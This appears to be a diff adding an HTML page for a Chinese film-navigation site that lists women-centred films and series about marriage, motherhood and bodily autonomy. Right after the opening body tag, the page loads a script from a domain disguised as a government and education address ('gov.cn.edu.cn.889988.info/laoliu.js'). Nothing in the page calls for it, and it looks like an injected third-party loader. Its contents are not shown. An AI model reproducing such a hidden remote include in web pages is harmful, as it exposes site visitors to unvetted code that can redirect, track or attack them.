@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>琪琪伦理电影网 - 女性视角·婚姻·身体·母职 伦理影视导航</title>
+<meta name="description" content="琪琪伦理电影网（qiqilunlidianyingwang-h5）以女性视角整理婚姻伦理、母职困境、身体自主、亲密关系权力结构类影视作品导航，暗粉蔷薇风、移动端自适应、必应收录友好。">
+<meta name="keywords" content="琪琪伦理电影网, qiqilunlidianyingwang-h5, 女性电影, 婚姻伦理, 母职困境, 身体自主, 女性悬疑, 亲密关系, 女性剧集">
+<meta name="author" content="琪琪伦理电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --wine:#6B1A2A;
+  --rose:#C44D6B;
+  --rose-light:#E88A9E;
+  --cream:#FDF6F0;
+  --cream-dark:#F3E5D8;
+  --green:#2D3B2A;
+  --gold:#B8860B;
+  --ink:#2A1A1F;
+  --dim:#7A5C64;
+  --line:#E8D0D8;
+  --card:#FFF9F5;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;
+  background:
+    radial-gradient(700px 500px at 88% -10%,rgba(196,77,107,.14),transparent 60%),
+    radial-gradient(600px 400px at 5% 10%,rgba(107,26,42,.12),transparent 58%),
+    var(--cream);
+  color:var(--ink);line-height:1.9;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:1;background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23c44d6b' fill-opacity='0.04'%3E%3Cpath d='M30 20c5.5 0 10 4.5 10 10s-4.5 10-10 10-10-4.5-10-10 4.5-10 10-10zm0 3c-3.9 0-7 3.1-7 7s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}
+a{color:var(--rose);text-decoration:none;transition:.3s}
+a:hover{color:var(--wine)}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(253,246,240,.93);backdrop-filter:blur(10px);border-bottom:2px solid var(--rose)}
+.bar-in{max-width:1180px;margin:0 auto;height:64px;padding:0 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:900;font-size:19px;letter-spacing:2px;display:flex;align-items:center;gap:12px}
+.rose-logo{width:32px;height:32px;position:relative;display:grid;place-items:center}
+.rose-logo::before{content:"🌹";font-size:22px;filter:drop-shadow(0 2px 4px rgba(196,77,107,.3))}
+.brand b{color:var(--rose)}
+.brand i{font-style:normal;font-size:8px;letter-spacing:2px;color:var(--dim);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:2px;list-style:none}
+.nav a{padding:7px 13px;font-size:12px;font-weight:700;color:var(--ink);border-radius:4px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:var(--rose);color:#fff;border-color:var(--wine)}
+.burger{display:none;background:none;border:none;font-size:22px;color:var(--rose);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1180px;margin:0 auto;padding:80px 18px 58px;text-align:center;position:relative;z-index:2}
+.hero::before{content:"SHE SEES";position:absolute;top:10px;left:50%;transform:translateX(-50%);font-size:clamp(60px,12vw,140px);font-weight:900;color:var(--rose);opacity:.05;letter-spacing:20px;z-index:-1;white-space:nowrap}
+.stamp{display:inline-block;font-size:10px;letter-spacing:4px;color:var(--wine);border:1.5px solid var(--wine);padding:5px 16px;border-radius:2px;font-family:ui-monospace,Consolas,monospace;transform:rotate(-2deg)}
+.hero h1{font-size:clamp(32px,7vw,56px);font-weight:900;letter-spacing:4px;margin:18px 0 14px}
+.hero h1 span{color:var(--rose)}
+.hero p{color:var(--dim);max-width:580px;margin:0 auto 26px;font-size:14px}
+.themes{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:26px}
+.theme{font-size:12px;font-weight:700;padding:7px 15px;border:1px solid var(--line);background:var(--card);border-radius:2px;color:var(--wine)}
+.theme.t{background:var(--rose);color:#fff;border-color:var(--wine)}
+.theme.g{background:var(--green);color:#fff;border-color:var(--green)}
+.cta{display:inline-block;padding:13px 34px;border-radius:3px;font-weight:800;color:#fff;background:var(--wine);letter-spacing:2px;box-shadow:0 8px 22px rgba(107,26,42,.3)}
+.cta:hover{transform:translateY(-3px);color:#fff;background:var(--rose)}
+
+/* 区块 */
+.section{max-width:1180px;margin:0 auto;padding:56px 18px;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:1.5px solid var(--rose);padding-bottom:10px;margin-bottom:28px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:3px}
+.head h2::before{content:"✦ ";}
+.head a{font-size:12px;color:var(--dim)}
+
+/* 电影：围城片库 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:20px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:16px;transition:.35s;position:relative;overflow:hidden}
+.film:hover{transform:translateY(-5px);box-shadow:0 16px 32px rgba(107,26,42,.15);border-color:var(--rose)}
+.film .frame{height:130px;display:grid;place-items:center;font-size:44px;margin-bottom:12px;background:linear-gradient(160deg,var(--cream-dark),#e8d4dc);border-radius:3px}
+.film .lbl{position:absolute;top:18px;left:18px;font-size:10px;font-weight:800;padding:3px 8px;border-radius:2px;background:var(--wine);color:#fff;font-family:ui-monospace,Consolas,monospace}
+.film .lbl.m{background:var(--rose)}
+.film .lbl.b{background:var(--green)}
+.film .lbl.g{background:var(--gold);color:var(--ink)}
+.film h3{font-size:16px;letter-spacing:1px}
+.film .meta{font-size:12px;color:var(--dim);margin-top:4px}
+.film .dilemma{font-size:12px;color:var(--ink);margin-top:8px;border-left:3px solid var(--rose);padding-left:8px;font-style:italic}
+.film .tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.tag{font-size:10px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--wine)}
+.tag.hot{background:var(--rose);color:#fff;border-color:var(--wine)}
+
+/* 剧集：她剧场 */
+.hall{display:flex;flex-direction:column;gap:12px}
+.row{display:grid;grid-template-columns:68px 1fr 110px;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px 18px;transition:.3s}
+.row:hover{padding-left:24px;border-color:var(--rose);background:linear-gradient(90deg,var(--card),var(--cream-dark))}
+.row .tag-era{font-family:ui-monospace,Consolas,monospace;font-size:11px;font-weight:800;color:var(--wine);text-align:center;letter-spacing:1px}
+.row h4{font-size:15px}
+.row p{font-size:12px;color:var(--dim)}
+.row .lens{font-size:11px;font-weight:800;padding:4px 10px;border-radius:2px;border:1px solid var(--rose);color:var(--rose);text-align:center}
+.row .lens.deep{color:#fff;background:var(--wine);border-color:var(--wine)}
+.row .lens.power{color:#fff;background:var(--green);border-color:var(--green)}
+
+/* 深度：身体与选择 */
+.depth{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px}
+.case{background:var(--card);border-left:4px solid var(--rose);border-top:1px solid var(--line);border-right:1px solid var(--line);border-bottom:1px solid var(--line);border-radius:0 4px 4px 0;padding:18px;transition:.3s}
+.case:hover{border-left-color:var(--wine);background:#fff}
+.case .q{font-size:12px;font-weight:800;color:var(--rose);margin-bottom:6px;letter-spacing:1px}
+.case h4{font-size:15px;margin-bottom:6px}
+.case p{font-size:12px;color:var(--dim)}
+.case .voices{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.voice{font-size:10px;padding:3px 8px;background:var(--cream-dark);border-radius:2px;color:var(--ink)}
+
+/* 排行榜：刺痛榜 */
+.rank{display:flex;flex-direction:column;gap:14px}
+.rk{display:grid;grid-template-columns:44px 1fr 140px;align-items:center;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px 18px}
+.rk .no{font-size:20px;font-weight:900;color:var(--rose);font-family:ui-monospace,Consolas,monospace}
+.rk h4{font-size:15px}
+.rk .axes{display:flex;gap:10px;margin-top:6px}
+.rk .axes div{flex:1}
+.rk .axes small{font-size:9px;color:var(--dim)}
+.rk .axes i{display:block;height:6px;border-radius:1px;background:var(--rose);margin-top:3px}
+.rk .axes .a2 i{background:var(--gold)}
+.rk .right{text-align:right;font-family:ui-monospace,Consolas,monospace;font-size:12px}
+.rk .right b{color:var(--wine)}
+.rk .right small{display:block;color:var(--dim);font-size:10px}
+
+/* 关于：琪琪观影守则 */
+.note{max-width:820px;margin:0 auto;background:var(--card);border:2px solid var(--rose);border-radius:4px;padding:34px;position:relative}
+.note::before{content:"琪琪观影守则";position:absolute;top:-12px;left:24px;background:var(--wine);color:#fff;font-size:11px;font-weight:800;letter-spacing:3px;padding:5px 14px}
+.note h3{font-size:18px;margin-bottom:12px;letter-spacing:1px}
+.note p{font-size:14px;color:#5a3a44;margin-bottom:10px}
+.rules{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
+.rule{border:1px solid var(--line);border-radius:4px;padding:12px;font-size:13px;background:var(--cream)}
+.lnks{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:2px;font-size:13px;color:var(--ink)}
+.lnks a:hover{border-color:var(--rose);color:var(--rose)}
+
+/* 页脚 */
+.foot{border-top:2px solid var(--rose);padding:30px 18px;text-align:center;color:var(--dim);font-size:13px;position:relative;z-index:2}
+.foot a{color:var(--dim);margin:0 6px}
+.foot .big{font-size:17px;font-weight:900;color:var(--ink);letter-spacing:2px;margin-bottom:8px}
+.foot .url{color:var(--rose)}
+
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:rgba(253,246,240,.97);border-bottom:2px solid var(--rose);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:13px 15px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:50px 16px 36px}
+  .section{padding:36px 16px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .film .frame{height:92px;font-size:30px}
+  .row{grid-template-columns:52px 1fr;gap:10px;padding:12px}
+  .row .lens{grid-column:2;justify-self:start}
+  .rk{grid-template-columns:32px 1fr 90px;gap:10px;padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="brand"><span class="rose-logo"></span><div>琪琪<b>伦理电影网</b><i>QIQILUNLIDIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#films">围城片库</a></li>
+      <li><a href="#drama">她剧场</a></li>
+      <li><a href="#depth">身体与选择</a></li>
+      <li><a href="#rank">刺痛榜</a></li>
+      <li><a href="#about">观影守则</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <span class="stamp">WOMAN'S GAZE · MORALITY · CINEMA</span>
+  <h1>琪琪<span>伦理电影网</span></h1>
+  <p>qiqilunlidianyingwang-h5 · 用女性视角重新看片：婚姻围城、母职困境、身体自主、亲密关系里的权力——不审判，只呈现。</p>
+  <div class="themes">
+    <span class="theme t">婚姻围城</span>
+    <span class="theme g">母职困境</span>
+    <span class="theme">身体自主</span>
+    <span class="theme t">代际创伤</span>
+    <span class="theme">亲密权力</span>
+  </div>
+  <a href="#films" class="cta">翻开片单</a>
+</header>
+
+<section class="section" id="films">
+  <div class="head"><h2>围城片库 / MARRIAGE & MOTHERHOOD</h2><a href="#">更多 →</a></div>
+  <div class="grid">
+    <div class="film"><span class="lbl">婚姻</span><div class="frame">💍</div><h3>婚姻故事</h3><div class="meta">诺亚·鲍姆巴赫 / 2019 / 离婚·撕扯</div><div class="dilemma">"爱还在，但两个人已经不能住了。"</div><div class="tags"><span class="tag hot">女性视角</span><span class="tag">撕心</span></div></div>
+    <div class="film"><span class="lbl m">母职</span><div class="frame">🤱</div><h3>塔利</h3><div class="meta">贾森·雷特曼 / 2018 / 产后·自我消失</div><div class="dilemma">"当了妈之后，那个'我'去哪儿了？"</div><div class="tags"><span class="tag hot">产后抑郁</span><span class="tag">身份焦虑</span></div></div>
+    <div class="film"><span class="lbl b">代际</span><div class="frame">🏠</div><h3>春潮</h3><div class="meta">杨荔钠 / 2020 / 母女·控制·沉默</div><div class="dilemma">"母亲的爱像潮水，也像溺水。"</div><div class="tags"><span class="tag">华语</span><span class="tag">母女关系</span></div></div>
+    <div class="film"><span class="lbl">出轨</span><div class="frame">🔑</div><h3>消失的爱人</h3><div class="meta">大卫·芬奇 / 2014 / 婚姻·叙事诡计</div><div class="dilemma">"完美妻子是人设，还是囚笼？"</div><div class="tags"><span class="tag hot">反转</span><span class="tag">女性暗面</span></div></div>
+    <div class="film"><span class="lbl g">身体</span><div class="frame">🩸</div><h3>从不，很少，有时，总是</h3><div class="meta">伊丽莎·希特曼 / 2020 / 堕胎·跨州求医</div><div class="dilemma">"身体是自己的吗？法律说不一定。"</div><div class="tags"><span class="tag hot">身体自主</span><span class="tag">美国现实</span></div></div>
+    <div class="film"><span class="lbl m">母职</span><div class="frame">🎪</div><h3>伯德夫人</h3><div class="meta">格蕾塔·葛韦格 / 2017 / 少女·母亲·逃离</div><div class="dilemma">"我要离开你，才能成为我自己。"</div><div class="tags"><span class="tag">成长</span><span class="tag">母女拉锯</span></div></div>
+    <div class="film"><span class="lbl">婚姻</span><div class="frame">🚪</div><h3>45周年</h3><div class="meta">安德鲁·海格 / 2015 / 老年婚姻·秘密</div><div class="dilemma">"一辈子的婚姻，抵不过一个名字。"</div><div class="tags"><span class="tag">英伦</span><span class="tag">细思恐极</span></div></div>
+    <div class="film"><span class="lbl b">代际</span><div class="frame">📿</div><h3>女人四十</h3><div class="meta">许鞍华 / 1995 / 婆媳·职场·中年</div><div class="dilemma">"上有老下有小，中间那个自己先碎了。"</div><div class="tags"><span class="tag">港片</span><span class="tag">女性群像</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="drama" style="background:rgba(232,208,216,.2)">
+  <div class="head"><h2>她剧场 / HER STORIES</h2><a href="#">全部 →</a></div>
+  <div class="hall">
+    <div class="row"><div class="tag-era">韩剧</div><div><h4>黑暗荣耀</h4><p>被霸凌者的成年复仇——但核心是"她怎么从废墟里站起来"</p></div><span class="lens deep">复仇·女性</span></div>
+    <div class="row"><div class="tag-era">英剧</div><div><h4>王冠（女性篇）</h4><p>伊丽莎白二世、戴安娜、玛格丽特——三种女性命运被王冠定义</p></div><span class="lens">权力·女性</span></div>
+    <div class="row"><div class="tag-era">美剧</div><div><h4>使女的故事</h4><p>身体被征用、名字被剥夺——极端情境下的女性生存</p></div><span class="lens deep">反乌托邦</span></div>
+    <div class="row"><div class="tag-era">华语</div><div><h4>俗女养成记</h4><p>不是大女主，是"普通女孩也可以不优秀但很快乐"</p></div><span class="lens power">普通女性</span></div>
+    <div class="row"><div class="tag-era">日剧</div><div><h4>坡道上的家</h4><p>母亲杀婴案陪审团——每个女人都从被告身上看到了自己</p></div><span class="lens deep">母职审判</span></div>
+  </div>
+</section>
+
+<section class="section" id="depth">
+  <div class="head"><h2>身体与选择 / BODY & CHOICE</h2><a href="#">更多议题 →</a></div>
+  <div class="depth">
+    <div class="case"><div class="q">ISSUE 01 · 堕胎权</div><h4>你的子宫，谁说了算？</h4><p>从《从不》到《四月三周两天》，电影如何记录女性穿越法律迷宫去拿回身体主权。</p><div class="voices"><span class="voice">法律</span><span class="voice">宗教</span><span class="voice">身体自主</span></div></div>
+    <div class="case"><div class="q">ISSUE 02 · 家暴</div><h4>离开为什么那么难？</h4><p>《柯莱特》《无依之地》里的"逃离"不是浪漫，是计算过无数次才迈出的那一步。</p><div class="voices"><span class="voice">经济依赖</span><span class="voice">羞耻感</span><span class="voice">循环</span></div></div>
+    <div class="case"><div class="q">ISSUE 03 · 容貌</div><h4>谁在定义"好看"？</h4><p>《骨瘦如柴》《丑女大翻身》——镜头本身就是一面审判的镜子。</p><div class="voices"><span class="voice">凝视</span><span class="voice">审美标准</span><span class="voice">自我</span></div></div>
+    <div class="case"><div class="q">ISSUE 04 · 年龄</div><h4>女人的"保质期"是谎言吗？</h4><p>《下一站，天国》《比海更深》——中年女性的欲望和悲伤都不该被静音。</p><div class="voices"><span class="voice">年龄焦虑</span><span class="voice">社会时钟</span><span class="voice">自我和解</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:rgba(232,208,216,.2)">
+  <div class="head"><h2>刺痛榜 / STING INDEX</h2><a href="#">完整榜单 →</a></div>
+  <div class="rank">
+    <div class="rk"><div class="no">01</div><div><h4>从不，很少，有时，总是</h4><div class="axes"><div><small>刺痛感</small><i style="width:98%"></i></div><div class="a2"><small>共情度</small><i style="width:96%"></i></div></div></div><div class="right"><b>身体自主</b><small>沉默中的暴击</small></div></div>
+    <div class="rk"><div class="no">02</div><div><h4>坡道上的家</h4><div class="axes"><div><small>刺痛感</small><i style="width:95%"></i></div><div class="a2"><small>共情度</small><i style="width:99%"></i></div></div></div><div class="right"><b>母职审判</b><small>每个母亲都怕</small></div></div>
+    <div class="rk"><div class="no">03</div><div><h4>塔利</h4><div class="axes"><div><small>刺痛感</small><i style="width:92%"></i></div><div class="a2"><small>共情度</small><i style="width:94%"></i></div></div></div><div class="right"><b>产后消失</b><small>当妈≠失去自己</small></div></div>
+    <div class="rk"><div class="no">04</div><div><h4>春潮</h4><div class="axes"><div><small>刺痛感</small><i style="width:90%"></i></div><div class="a2"><small>共情度</small><i style="width:93%"></i></div></div></div><div class="right"><b>母女绞杀</b><small>爱是潮水也是溺水</small></div></div>
+    <div class="rk"><div class="no">05</div><div><h4>使女的故事</h4><div class="axes"><div><small>刺痛感</small><i style="width:97%"></i></div><div class="a2"><small>共情度</small><i style="width:88%"></i></div></div></div><div class="right"><b>极端情境</b><small>身体即政治</small></div></div>
+    <div class="rk"><div class="no">06</div><div><h4>消失的爱人</h4><div class="axes"><div><small>刺痛感</small><i style="width:88%"></i></div><div class="a2"><small>共情度</small><i style="width:85%"></i></div></div></div><div class="right"><b>完美受害者</b><small>叙事即武器</small></div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="head"><h2>琪琪观影守则 / QIQI'S RULES</h2></div>
+  <div class="note">
+    <h3>"不审判角色，只看见结构。"</h3>
+    <p>琪琪伦理电影网（qiqilunlidianyingwang-h5）不做道德警察，不贴"好女人/坏女人"标签。我们只整理那些把女性放在复杂处境里的影视作品——让观众自己感受、自己判断。</p>
+    <p>本站为静态影视导航页，不存储、不分发视频文件；片单与议题来自公开影视资料与女性主义影评共识，如有版权问题请联系下架。</p>
+    <div class="rules">
+      <div class="rule">🌹 女性视角优先选片</div>
+      <div class="rule">🚫 不消费受害者、不二次伤害</div>
+      <div class="rule">📖 每部片附"困境一句话"</div>
+      <div class="rule">🪞 看见结构，而非审判个人</div>
+    </div>
+    <div class="lnks">
+      <a href="#">婚姻片单</a><a href="#">母职专题</a><a href="#">身体自主片单</a><a href="#">女性悬疑合集</a><a href="#">留言讨论</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">琪琪伦理电影网 · QIQILUNLIDIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#films">围城片库</a> | <a href="#drama">她剧场</a> | <a href="#depth">身体与选择</a> | <a href="#rank">刺痛榜</a></p>
+  <p>官网：<span class="url">https://qiqilunlidianyingwang-h5.github.io</span></p>
+  <p>© 2026 琪琪伦理电影网 · 她看见，她选择，她讲述。</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
